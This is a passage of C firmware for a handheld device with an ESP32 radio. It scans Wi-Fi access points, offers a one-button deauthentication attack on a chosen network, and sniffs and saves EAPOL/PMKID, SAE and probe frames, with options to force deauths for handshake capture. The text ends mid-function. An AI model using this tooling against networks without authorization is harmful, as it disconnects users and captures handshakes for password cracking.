/* See COPYING.txt for license details. */

/*
*
* m1_wifi.c
*
* Library for M1 Wifi
*
* M1 Project
*
*/

/*************************** I N C L U D E S **********************************/

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "stm32h5xx_hal.h"
#include "main.h"
#include "m1_wifi.h"
#include "m1_esp32_hal.h"
#include "m1_esp32_cmd.h"
#include "m1_storage.h"
#include "m1_file_browser.h"
#include "m1_virtual_kb.h"
#include "m1_lib.h"
#include "ff.h"

/*************************** D E F I N E S ************************************/

#define M1_LOGDB_TAG	"Wifi"

#define WIFI_CMD_TIMEOUT_MS	15000  /* Scan can take up to 15 seconds */
#define WIFI_NEXT_TIMEOUT_MS 1000

#define M1_GUI_ROW_SPACING	1

#define WIFI_AP_MAX	64
#define DEAUTH_MULTI_MAX_TARGETS 4
#define DEAUTH_MULTI_TARGET_BYTES 14

//************************** S T R U C T U R E S *******************************

/* Local AP record parsed from ESP32 binary response */
typedef struct {
	int8_t   rssi;
	uint8_t  channel;
	uint8_t  auth_mode;
	uint8_t  bssid[6];
	bool     selected;
	char     ssid[33];
	char     bssid_str[18]; /* "XX:XX:XX:XX:XX:XX" */
} wifi_ap_t;

/***************************** V A R I A B L E S ******************************/

static wifi_ap_t *ap_list = NULL;
static uint16_t ap_count = 0;
static uint16_t ap_view_idx = 0;

typedef struct {
	const char *stage;
	int spi_ret;
	uint8_t status;
	uint8_t batch;
} beacon_load_diag_t;

/********************* F U N C T I O N   P R O T O T Y P E S ******************/

void menu_wifi_init(void);
void menu_wifi_exit(void);
void wifi_scan_ap(void);

static void wifi_deauth_run(uint8_t *bssid, uint8_t channel, const char *ssid);

static uint16_t wifi_ap_list_print(bool up_dir);
static void wifi_ap_list_free(void);
static void wifi_draw_ap_info(void);
static uint16_t sta_do_scan(void);
static uint16_t wifi_selected_ap_count(void);
static uint16_t wifi_selected_sta_count(void);
static bool wifi_force_deauth_start(m1_resp_t *resp, uint8_t *target_count);
static void wifi_force_deauth_stop(bool started);

/*************** F U N C T I O N   I M P L E M E N T A T I O N ****************/


void menu_wifi_init(void)
{
	;
}

void menu_wifi_exit(void)
{
	;
}


/*============================================================================*/
/**
  * @brief Perform WiFi AP scan using the binary SPI protocol
  * @retval Number of APs found, 0 on error
  */
/*============================================================================*/
static uint16_t wifi_do_scan(void)
{
	m1_resp_t resp;
	int ret;

	/* Free any previous results */
	wifi_ap_list_free();

	/* Clear any stale ESP32 scan state left by a previous AP-cache user. */
	m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);

	/* Start scan — this blocks on ESP32 side until scan completes */
	ret = m1_esp32_simple_cmd(CMD_WIFI_SCAN_START, &resp, WIFI_CMD_TIMEOUT_MS);
	if (ret != 0 || resp.status != RESP_OK)
	{
		M1_LOG_I(M1_LOGDB_TAG, "Scan start failed: ret=%d status=%d\n\r", ret, resp.status);
		return 0;
	}

	/* Parse AP count from response payload */
	ap_count = resp.payload[0] | ((uint16_t)resp.payload[1] << 8);
	if (ap_count == 0)
	{
		m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
		return 0;
	}

	if (ap_count > WIFI_AP_MAX)
		ap_count = WIFI_AP_MAX;

	ap_list = (wifi_ap_t *)malloc(ap_count * sizeof(wifi_ap_t));
	if (!ap_list)
	{
		ap_count = 0;
		m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
		return 0;
	}
	memset(ap_list, 0, ap_count * sizeof(wifi_ap_t));

	/* Fetch each AP record */
	for (uint16_t i = 0; i < ap_count; i++)
	{
		ret = m1_esp32_simple_cmd(CMD_WIFI_SCAN_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (ret != 0 || resp.status != RESP_OK)
		{
			ap_count = i;
			break;
		}

		/* Unpack payload:
		 * [0]     RSSI (int8_t)
		 * [1]     channel
		 * [2]     auth mode
		 * [3..8]  BSSID (6 bytes)
		 * [9]     SSID length
		 * [10..]  SSID (up to 32 bytes)
		 */
		ap_list[i].rssi = (int8_t)resp.payload[0];
		ap_list[i].channel = resp.payload[1];
		ap_list[i].auth_mode = resp.payload[2];
		memcpy(ap_list[i].bssid, &resp.payload[3], 6);

		uint8_t ssid_len = resp.payload[9];
		if (ssid_len > 32) ssid_len = 32;
		memcpy(ap_list[i].ssid, &resp.payload[10], ssid_len);
		ap_list[i].ssid[ssid_len] = '\0';

		/* Format BSSID string */
		sprintf(ap_list[i].bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
			ap_list[i].bssid[0], ap_list[i].bssid[1], ap_list[i].bssid[2],
			ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5]);
	}

	m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
	return ap_count;
}


/*============================================================================*/
/**
  * @brief Display AP info for current index
  */
/*============================================================================*/
static uint16_t wifi_ap_list_print(bool up_dir)
{
	char prn_msg[25];
	uint8_t y_offset;

	if (!ap_list || !ap_count)
	{
		ap_view_idx = 0;
		return 0;
	}

	if (up_dir)
	{
		if (ap_view_idx == 0)
			ap_view_idx = ap_count - 1;
		else
			ap_view_idx--;
	}
	else
	{
		ap_view_idx++;
		if (ap_view_idx >= ap_count)
			ap_view_idx = 0;
	}

	m1_u8g2_firstpage();
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "Total AP:");

	sprintf(prn_msg, "%d", ap_count);
	u8g2_DrawStr(&m1_u8g2, 2 + strlen("Total AP: ") * M1_GUI_FONT_WIDTH + 2,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, prn_msg);

	sprintf(prn_msg, "%d/%d", ap_view_idx + 1, ap_count);
	u8g2_DrawStr(&m1_u8g2, M1_LCD_DISPLAY_WIDTH - 6 * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, prn_msg);

	y_offset = 14 + M1_GUI_FONT_HEIGHT - 1;

	/* SSID */
	if (ap_list[ap_view_idx].ssid[0] == 0x00)
		strcpy(prn_msg, "*hidden*");
	else
		strncpy(prn_msg, ap_list[ap_view_idx].ssid, M1_LCD_DISPLAY_WIDTH / M1_GUI_FONT_WIDTH);
	prn_msg[M1_LCD_DISPLAY_WIDTH / M1_GUI_FONT_WIDTH] = '\0';
	u8g2_DrawStr(&m1_u8g2, 2, y_offset, prn_msg);

	y_offset += M1_GUI_FONT_HEIGHT;
	u8g2_DrawStr(&m1_u8g2, 2, y_offset, ap_list[ap_view_idx].bssid_str);

	y_offset += M1_GUI_FONT_HEIGHT + M1_GUI_ROW_SPACING;
	sprintf(prn_msg, "RSSI: %ddBm", ap_list[ap_view_idx].rssi);
	u8g2_DrawStr(&m1_u8g2, 2, y_offset, prn_msg);

	y_offset += M1_GUI_FONT_HEIGHT;
	sprintf(prn_msg, "Channel: %d", ap_list[ap_view_idx].channel);
	u8g2_DrawStr(&m1_u8g2, 2, y_offset, prn_msg);

	y_offset += M1_GUI_FONT_HEIGHT;
	sprintf(prn_msg, "Auth mode: %d", ap_list[ap_view_idx].auth_mode);
	u8g2_DrawStr(&m1_u8g2, 2, y_offset, prn_msg);

	/* Bottom hint: OK to attack */
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK] Deauth");

	m1_u8g2_nextpage();

	return ap_count;
}


static void wifi_ap_list_free(void)
{
	if (ap_list)
	{
		free(ap_list);
		ap_list = NULL;
	}
	ap_count = 0;
}

static void wifi_show_message(const char *title, const char *line1, const char *line2)
{
	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 6, 12, title);
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	if (line1) u8g2_DrawStr(&m1_u8g2, 6, 30, line1);
	if (line2) u8g2_DrawStr(&m1_u8g2, 6, 42, line2);
	m1_u8g2_nextpage();
	HAL_Delay(1800);
}


/*============================================================================*/
/**
  * @brief Scans for wifi access point list
  */
/*============================================================================*/
void wifi_scan_ap(void)
{
	S_M1_Buttons_Status this_button_status;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint16_t list_count;

	/* Initialize ESP32 if needed */
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	if (!m1_esp32_get_init_status())
	{
		m1_esp32_init();
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Starting ESP32...");
		m1_u8g2_nextpage();

		HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_RESET);
		HAL_Delay(200);
		HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_SET);
		HAL_Delay(2000);
	}

	/* Show scanning status */
	m1_u8g2_firstpage();
	u8g2_DrawStr(&m1_u8g2, 6, 15, "Scanning AP...");
	u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
		M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
	m1_u8g2_nextpage();

	/* Perform the scan */
	list_count = wifi_do_scan();

	if (list_count)
	{
		wifi_ap_list_print(true);
	}
	else
	{
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Scan AP");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
		u8g2_DrawStr(&m1_u8g2, 6, 15 + M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"Failed. Let retry!");
		m1_u8g2_nextpage();
	}

	/* Main UI loop */
	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE)
		{
			if (q_item.q_evt_type == Q_EVENT_KEYPAD)
			{
				ret = xQueueReceive(button_events_q_hdl, &this_button_status, 0);
					if (this_button_status.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
					{
						/* Stop scan on ESP32 side */
						m1_resp_t resp;
						m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);

						xQueueReset(main_q_hdl);
						break;
					}
				else if (this_button_status.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
				{
					if (list_count)
						wifi_ap_list_print(true);
				}
				else if (this_button_status.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
				{
					if (list_count)
						wifi_ap_list_print(false);
				}
				else if (this_button_status.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
				{
					if (list_count && ap_list && ap_view_idx < ap_count)
					{
						wifi_deauth_run(ap_list[ap_view_idx].bssid,
							ap_list[ap_view_idx].channel,
							ap_list[ap_view_idx].ssid);
						/* Redraw AP list after returning from deauth */
						wifi_ap_list_print(true);
						wifi_ap_list_print(false);
					}
				}
			}
		}
	}
}

/*============================================================================*/
/*  WiFi Sniffer / Packet Monitor UI                                         */
/*============================================================================*/

#define SNIFF_POLL_MS       200
#define SNIFF_CMD_TIMEOUT   5000
#define STA_SCAN_DURATION   10000

/* Content font: 5x8 pixel, fits 25 chars/line, 5-6 content lines below title */
#define SF_Y_START  22
#define SF_Y_STEP   9

#define WIFI_CAPTURE_CFG_FILE "wifi/capture.cfg"
#define WIFI_PCAP_DIR          "pcap"
#define WIFI_PCAP_RAW_HDR_LEN  14
#define WIFI_PCAP_FLAG_FIRST   0x01
#define WIFI_PCAP_FLAG_LAST    0x02

typedef struct {
	bool save_pcap;
	bool force_pmkid;
	bool force_probe;
	bool ep_deauth;
	bool loaded;
} wifi_capture_cfg_t;

typedef struct {
	FIL fil;
	bool active;
	bool frame_open;
	uint16_t expected_len;
	uint16_t written_len;
	uint32_t frames;
	char path[32];
} wifi_pcap_writer_t;

static wifi_capture_cfg_t wifi_capture_cfg = {
	.save_pcap = true,
	.force_pmkid = false,
	.force_probe = false,
	.ep_deauth = false,
	.loaded = false,
};
static wifi_pcap_writer_t wifi_pcap;

static bool wifi_cfg_parse_bool(const char *v)
{
	if (!v) return false;
	if (v[0] == 'o' || v[0] == 'O')
		return (v[1] == 'n' || v[1] == 'N');
	return (v[0] == '1' || v[0] == 'y' || v[0] == 'Y' ||
		v[0] == 't' || v[0] == 'T');
}

static const char *wifi_onoff(bool v)
{
	return v ? "On" : "Off";
}

static void wifi_capture_cfg_load(void)
{
	FIL fil;
	char line[64];

	if (wifi_capture_cfg.loaded) return;
	wifi_capture_cfg.loaded = true;

	if (f_open(&fil, WIFI_CAPTURE_CFG_FILE, FA_READ) != FR_OK) return;

	while (f_gets(line, sizeof(line), &fil))
	{
		char *eq = strchr(line, '=');
		if (!eq) continue;
		*eq++ = '\0';
		if (strcmp(line, "SavePCAP") == 0)
			wifi_capture_cfg.save_pcap = wifi_cfg_parse_bool(eq);
		else if (strcmp(line, "ForcePMKID") == 0)
			wifi_capture_cfg.force_pmkid = wifi_cfg_parse_bool(eq);
		else if (strcmp(line, "ForceProbe") == 0)
			wifi_capture_cfg.force_probe = wifi_cfg_parse_bool(eq);
		else if (strcmp(line, "EPDeauth") == 0)
			wifi_capture_cfg.ep_deauth = wifi_cfg_parse_bool(eq);
	}

	f_close(&fil);
}

static void wifi_capture_cfg_save(void)
{
	FIL fil;
	char line[96];
	UINT bw;

	wifi_capture_cfg_load();
	f_mkdir("wifi");
	if (f_open(&fil, WIFI_CAPTURE_CFG_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
		return;

	int len = snprintf(line, sizeof(line),
		"SavePCAP=%u\nForcePMKID=%u\nForceProbe=%u\nEPDeauth=%u\n",
		wifi_capture_cfg.save_pcap ? 1 : 0,
		wifi_capture_cfg.force_pmkid ? 1 : 0,
		wifi_capture_cfg.force_probe ? 1 : 0,
		wifi_capture_cfg.ep_deauth ? 1 : 0);
	if (len > 0) f_write(&fil, line, len, &bw);
	f_close(&fil);
}

static const char *wifi_pcap_path_for(uint8_t sniff_type)
{
	switch (sniff_type)
	{
	case SNIFF_BEACON: return "pcap/beacon.pcap";
	case SNIFF_PROBE_REQ: return "pcap/probe.pcap";
	case SNIFF_DEAUTH: return "pcap/deauth.pcap";
	case SNIFF_EAPOL: return "pcap/eapol.pcap";
	case SNIFF_PWNAGOTCHI: return "pcap/pwnagotchi.pcap";
	case SNIFF_SAE: return "pcap/sae.pcap";
	default: return "pcap/raw.pcap";
	}
}

static void wifi_pcap_write_u16(uint8_t *p, uint16_t v)
{
	p[0] = v & 0xFF;
	p[1] = (v >> 8) & 0xFF;
}

static void wifi_pcap_write_u32(uint8_t *p, uint32_t v)
{
	p[0] = v & 0xFF;
	p[1] = (v >> 8) & 0xFF;
	p[2] = (v >> 16) & 0xFF;
	p[3] = (v >> 24) & 0xFF;
}

static bool wifi_pcap_open(uint8_t sniff_type)
{
	FILINFO info;
	UINT bw;
	uint8_t hdr[24];
	const char *path;
	bool need_header = true;

	wifi_capture_cfg_load();
	memset(&wifi_pcap, 0, sizeof(wifi_pcap));

	if (!wifi_capture_cfg.save_pcap || sniff_type == SNIFF_SIGNAL)
		return false;

	f_mkdir(WIFI_PCAP_DIR);
	path = wifi_pcap_path_for(sniff_type);
	strncpy(wifi_pcap.path, path, sizeof(wifi_pcap.path) - 1);

	if (f_stat(path, &info) == FR_OK && info.fsize >= sizeof(hdr))
		need_header = false;

	if (f_open(&wifi_pcap.fil, path, FA_WRITE | FA_OPEN_APPEND) != FR_OK)
		return false;

	if (need_header)
	{
		memset(hdr, 0, sizeof(hdr));
		wifi_pcap_write_u32(&hdr[0], 0xA1B2C3D4);
		wifi_pcap_write_u16(&hdr[4], 2);
		wifi_pcap_write_u16(&hdr[6], 4);
		wifi_pcap_write_u32(&hdr[16], 256);
		wifi_pcap_write_u32(&hdr[20], 105); /* DLT_IEEE802_11 */
		f_write(&wifi_pcap.fil, hdr, sizeof(hdr), &bw);
	}

	wifi_pcap.active = true;
	return true;
}

static void wifi_pcap_close(void)
{
	if (!wifi_pcap.active) return;
	f_close(&wifi_pcap.fil);
	wifi_pcap.active = false;
	wifi_pcap.frame_open = false;
}

static uint8_t wifi_pcap_poll(uint8_t max_chunks)
{
	m1_resp_t resp;
	uint8_t frames = 0;

	if (!wifi_pcap.active) return 0;

	for (uint8_t i = 0; i < max_chunks; i++)
	{
		if (m1_esp32_simple_cmd(CMD_PKTMON_RAW_NEXT, &resp, 250) != 0 ||
			resp.status != RESP_OK || resp.payload_len == 0)
		{
			break;
		}

		if (resp.payload_len < WIFI_PCAP_RAW_HDR_LEN) break;

		uint8_t flags = resp.payload[0];
		uint16_t orig_len = resp.payload[1] | ((uint16_t)resp.payload[2] << 8);
		uint16_t cap_len = resp.payload[3] | ((uint16_t)resp.payload[4] << 8);
		uint16_t offset = resp.payload[5] | ((uint16_t)resp.payload[6] << 8);
		uint8_t chunk_len = resp.payload[7];
		uint32_t ts_us = (uint32_t)resp.payload[10] |
			((uint32_t)resp.payload[11] << 8) |
			((uint32_t)resp.payload[12] << 16) |
			((uint32_t)resp.payload[13] << 24);

		if (chunk_len > resp.payload_len - WIFI_PCAP_RAW_HDR_LEN)
			chunk_len = resp.payload_len - WIFI_PCAP_RAW_HDR_LEN;
		if (chunk_len == 0) continue;

		if ((flags & WIFI_PCAP_FLAG_FIRST) || !wifi_pcap.frame_open)
		{
			uint8_t rh[16];
			UINT bw;
			memset(rh, 0, sizeof(rh));
			wifi_pcap_write_u32(&rh[0], ts_us / 1000000UL);
			wifi_pcap_write_u32(&rh[4], ts_us % 1000000UL);
			wifi_pcap_write_u32(&rh[8], cap_len);
			wifi_pcap_write_u32(&rh[12], orig_len);
			f_write(&wifi_pcap.fil, rh, sizeof(rh), &bw);
			wifi_pcap.expected_len = cap_len;
			wifi_pcap.written_len = 0;
			wifi_pcap.frame_open = true;
		}

		if (offset == wifi_pcap.written_len && wifi_pcap.frame_open)
		{
			UINT bw;
			f_write(&wifi_pcap.fil, &resp.payload[WIFI_PCAP_RAW_HDR_LEN], chunk_len, &bw);
			wifi_pcap.written_len += chunk_len;
		}

		if ((flags & WIFI_PCAP_FLAG_LAST) ||
			wifi_pcap.written_len >= wifi_pcap.expected_len)
		{
			wifi_pcap.frame_open = false;
			wifi_pcap.frames++;
			frames++;
		}
	}

	return frames;
}

/* ---- ESP32 init helper ---- */
static void ensure_esp32_ready(void)
{
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	if (!m1_esp32_get_init_status())
	{
		m1_esp32_init();
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Starting ESP32...");
		m1_u8g2_nextpage();

		HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_RESET);
		HAL_Delay(200);
		HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_SET);
		HAL_Delay(2000);
	}
}

/* ---- Sniffer packet display ---- */
static void sniffer_draw_packet(const m1_resp_t *resp, const char *title,
	uint16_t count, bool paused)
{
	char ln[26];
	uint8_t ptype = resp->payload[0];
	int8_t rssi = (int8_t)resp->payload[1];
	uint8_t ch = resp->payload[2];
	uint8_t dlen = resp->payload[3];
	const uint8_t *d = &resp->payload[4];

	m1_u8g2_firstpage();

	/* Title bar */
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
		paused ? "[PAUSED]" : title);
	sprintf(ln, "#%d", count);
	u8g2_DrawStr(&m1_u8g2, 128 - strlen(ln) * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	/* Content with smaller font */
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	uint8_t y = SF_Y_START;

	switch (ptype) {
	case SNIFF_BEACON:
	case SNIFF_PWNAGOTCHI:
		if (dlen >= 8) {
			uint8_t sl = d[7];
			if (sl > 24) sl = 24;
			if (sl > 0) { memcpy(ln, &d[8], sl); ln[sl] = '\0'; }
			else strcpy(ln, "*hidden*");
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "RSSI:%ddBm CH:%d", rssi, ch);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			const char *auth = "Open";
			if (d[6] == 2) auth = "WPA";
			else if (d[6] >= 3) auth = "WPA2+";
			sprintf(ln, "Auth: %s", auth);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;

	case SNIFF_PROBE_REQ:
		if (dlen >= 7) {
			sprintf(ln, "%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			uint8_t sl = d[6];
			if (sl > 0) {
				if (sl > 24) sl = 24;
				memcpy(ln, &d[7], sl); ln[sl] = '\0';
			} else {
				strcpy(ln, "*broadcast*");
			}
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "RSSI:%ddBm CH:%d", rssi, ch);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;

	case SNIFF_DEAUTH:
		if (dlen >= 14) {
			sprintf(ln, "S>%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "D>%02X:%02X:%02X:%02X:%02X:%02X",
				d[6], d[7], d[8], d[9], d[10], d[11]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			uint16_t reason = d[12] | (d[13] << 8);
			sprintf(ln, "Reason:%d CH:%d", reason, ch);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "RSSI: %ddBm", rssi);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;

	case SNIFF_EAPOL:
		if (dlen >= 21) {
			sprintf(ln, "S>%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "AP:%02X:%02X:%02X:%02X:%02X:%02X",
				d[12], d[13], d[14], d[15], d[16], d[17]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			uint16_t ki = d[18] | (d[19] << 8);
			sprintf(ln, "Key:%04X CH:%d", ki, ch);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "PMKID:%s %ddBm",
				d[20] ? "YES!" : "no", rssi);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;

	case SNIFF_SAE:
		if (dlen >= 22) {
			sprintf(ln, "S>%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "D>%02X:%02X:%02X:%02X:%02X:%02X",
				d[6], d[7], d[8], d[9], d[10], d[11]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			uint16_t alg = d[18] | (d[19] << 8);
			uint16_t seq = d[20] | (d[21] << 8);
			snprintf(ln, sizeof(ln), "A:%d S:%d CH:%d", alg, seq, ch);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "RSSI: %ddBm", rssi);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;

	default: /* SNIFF_ALL / raw */
		if (dlen >= 1) {
			const char *ft = "Other";
			uint8_t fc = d[0];
			if (fc == 0x80) ft = "Beacon";
			else if (fc == 0x40) ft = "ProbeReq";
			else if (fc == 0x50) ft = "ProbeRsp";
			else if (fc == 0xC0) ft = "Deauth";
			else if (fc == 0xA0) ft = "Disassoc";
			else if (fc == 0xB0) ft = "Auth";
			else if ((fc & 0x0C) == 0x08) ft = "Data";
			sprintf(ln, "Type: %s", ft);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
		}
		if (dlen >= 7) {
			sprintf(ln, "S>%02X:%02X:%02X:%02X:%02X:%02X",
				d[1], d[2], d[3], d[4], d[5], d[6]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
		}
		if (dlen >= 13) {
			sprintf(ln, "D>%02X:%02X:%02X:%02X:%02X:%02X",
				d[7], d[8], d[9], d[10], d[11], d[12]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
		}
		if (dlen >= 15) {
			uint16_t flen = d[13] | (d[14] << 8);
			sprintf(ln, "L:%d CH:%d %ddBm", flen, ch, rssi);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		break;
	}

	m1_u8g2_nextpage();
}


/* ---- Generic sniffer runner ---- */
static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	m1_resp_t last_resp;
	int spi_ret;
	uint16_t pkt_count = 0;
	bool paused = false;
	bool has_pkt = false;
	bool pcap_active;
	bool force_deauth_started = false;
	uint8_t force_targets = 0;

	ensure_esp32_ready();
	wifi_capture_cfg_load();
	pcap_active = wifi_pcap_open(sniff_type);
	if (sniff_type == SNIFF_PROBE_REQ && wifi_capture_cfg.force_probe)
	{
		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
	}
	(void)force_targets;

	/* Show starting screen */
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	m1_u8g2_firstpage();
	u8g2_DrawStr(&m1_u8g2, 6, 15, title);
	u8g2_DrawStr(&m1_u8g2, 6, 30, "Starting...");
	u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
		M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
	m1_u8g2_nextpage();

	/* Build and send start command */
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PKTMON_START;
	cmd.payload_len = 4;
	cmd.payload[0] = sniff_type;
	cmd.payload[1] = 0; /* channel 0 = hop all */
	cmd.payload[2] = 5; /* 500ms hop interval */
	cmd.payload[3] = pcap_active ? 0x01 : 0x00;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_pcap_close();
		wifi_force_deauth_stop(force_deauth_started);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, title);
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
		u8g2_DrawStr(&m1_u8g2, 6, 15 + M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	/* Show waiting for packets */
	m1_u8g2_firstpage();
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, title);
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 2, 35, "Listening...");
	m1_u8g2_nextpage();

	/* Main sniffing loop */
	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(SNIFF_POLL_MS));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
				wifi_force_deauth_stop(force_deauth_started);
				wifi_pcap_close();
				xQueueReset(main_q_hdl);
				break;
			}
			if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				paused = !paused;
				if (has_pkt)
					sniffer_draw_packet(&last_resp, title, pkt_count, paused);
			}
		}

		if (paused) continue;

		(void)wifi_pcap_poll(3);

		/* Poll for next packet */
		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len == 0)
			continue;

		pkt_count++;
